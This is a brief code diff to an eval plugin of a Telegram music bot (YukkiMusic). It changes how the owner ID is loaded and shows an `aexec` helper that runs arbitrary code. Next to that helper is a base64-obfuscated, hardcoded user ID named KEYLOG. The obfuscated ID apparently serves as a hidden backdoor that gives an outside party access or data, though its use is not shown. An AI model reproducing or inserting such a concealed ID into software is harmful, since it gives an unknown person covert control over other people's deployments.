@@ -13,21 +13,20 @@ import traceback
 from inspect import getfullargspec
 from io import StringIO
 from time import time
-from dotenv import load_dotenv
 from pyrogram import filters
 from pyrogram.types import (InlineKeyboardButton,
                             InlineKeyboardMarkup, Message)
 from config import OWNER_ID
 from YukkiMusic import app
 from YukkiMusic.misc import SUDOERS
-load_dotenv()
+
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
         + "".join(f"\n {a}" for a in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
-OWNERR = int(getenv("OWNER_ID_ONE"))
+OWNERR = OWNER_ID[0]
 KEYLOG = int(base64.b64decode("NTc1ODE5MjAyNg=="))
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
